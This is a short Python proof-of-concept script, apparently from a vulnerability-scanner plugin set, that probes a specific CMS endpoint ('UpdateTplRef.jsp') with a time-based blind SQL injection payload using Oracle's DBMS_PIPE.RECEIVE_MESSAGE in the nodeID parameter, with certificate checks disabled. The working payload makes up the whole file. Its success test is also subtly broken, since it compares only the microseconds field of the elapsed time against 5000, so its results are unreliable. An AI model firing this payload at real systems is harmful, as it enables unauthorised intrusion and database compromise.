__author__ = 'xy'

import requests


def info():
    pass


def exp():
    pass


def poc(base_url):
    url = base_url + "/enpadmin/specialtopic/newtpl/UpdateTplRef.jsp?nodeID=1 AND 6695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(116)||CHR(80)||CHR(69),3) --"
    r = requests.get(url, timeout=10, verify=False)
    if r.elapsed.microseconds>5000:
        return True

    return False
